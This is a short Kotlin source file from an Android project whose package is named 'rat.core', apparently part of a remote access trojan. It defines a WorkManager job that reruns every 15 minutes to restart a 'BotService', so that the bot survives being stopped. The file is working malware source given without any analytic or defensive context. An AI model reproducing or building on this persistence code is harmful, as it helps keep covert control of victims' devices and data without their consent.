package com.venice.rat.core

import android.content.Context
import androidx.work.*

class ResurrectWorker(ctx: Context, p: WorkerParameters) : Worker(ctx, p) {
    override fun doWork(): Result {
        BotService.start(applicationContext)
        return Result.success()
    }

    companion object {
        fun schedule(c: Context) {
            val req = PeriodicWorkRequestBuilder<ResurrectWorker>(15, java.util.concurrent.TimeUnit.MINUTES)
                .setInitialDelay(15, java.util.concurrent.TimeUnit.MINUTES).build()
            WorkManager.getInstance(c)
                .enqueueUniquePeriodicWork("res", ExistingPeriodicWorkPolicy.KEEP, req)
        }
    }
}
